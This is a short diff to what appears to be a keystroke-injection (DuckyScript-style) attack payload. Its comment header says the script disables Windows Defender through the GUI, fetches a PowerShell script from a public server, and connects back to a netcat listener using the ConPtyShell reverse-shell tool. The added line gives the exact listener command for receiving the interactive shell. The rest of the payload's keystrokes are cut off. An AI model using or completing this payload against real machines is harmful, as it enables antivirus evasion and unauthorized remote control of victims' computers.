@@ -7,6 +7,7 @@ REM Notes:
 REM - This script temporarily disables Windows Defender through the GUI to ensure uninterrupted execution of PowerShell commands.                                                  
 REM - A public server is required to host the PowerShell script and netcat listening enabled                                                 
 REM - Refer to https://github.com/antonioCoco/ConPtyShell or Netcat for the project's documentation for implementation details. 
+REM - You need to set listening on your Netcat server first using this command: stty raw -echo; (stty size; cat) | nc -lvnp <port> -s <ip of your server>
 
 REM Disable Windows Defender AV
 GUI S
